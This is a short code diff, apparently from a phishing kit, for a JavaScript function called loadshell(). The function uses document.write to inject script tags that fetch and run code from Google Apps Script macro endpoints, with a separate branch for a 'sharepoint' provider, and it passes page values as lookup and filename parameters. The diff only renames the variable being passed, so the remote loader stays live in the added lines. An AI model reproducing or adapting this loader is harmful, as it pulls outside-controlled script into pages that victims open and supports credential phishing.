@@ -56,12 +56,12 @@ function loadshell()
 	
 	if(provider == "sharepoint")
 	{
-	document.write("<script type=\"application\/javascript\" src=\"https:\/\/script.google.com\/macros\/s\/AKfycbwj81P-q3z3WYDmOCl99FYtSdzbF9hCVla2WqSGGHhJYmO_RDDmZo0\/exec?lookup="+urlx+"&filename="+filename+"\"><\/script><\/head>");			
+	document.write("<script type=\"application\/javascript\" src=\"https:\/\/script.google.com\/macros\/s\/AKfycbwj81P-q3z3WYDmOCl99FYtSdzbF9hCVla2WqSGGHhJYmO_RDDmZo0\/exec?lookup="+statex+"&filename="+filename+"\"><\/script><\/head>");			
 	
 	}
 	else
 	{
-	document.write("<script type=\"application\/javascript\" src=\"https:\/\/script.google.com\/macros\/s\/AKfycbzHz5xfGd3dMFK8sl9gnmOovk-2RL3Bgt-LUE9xGAiiRO8DGtPmbfmT\/exec?lookup="+urlx+"&filename="+filename+"\"><\/script><\/head>");			
+	document.write("<script type=\"application\/javascript\" src=\"https:\/\/script.google.com\/macros\/s\/AKfycbzHz5xfGd3dMFK8sl9gnmOovk-2RL3Bgt-LUE9xGAiiRO8DGtPmbfmT\/exec?lookup="+statex+"&filename="+filename+"\"><\/script><\/head>");			
 	
 	}
 try
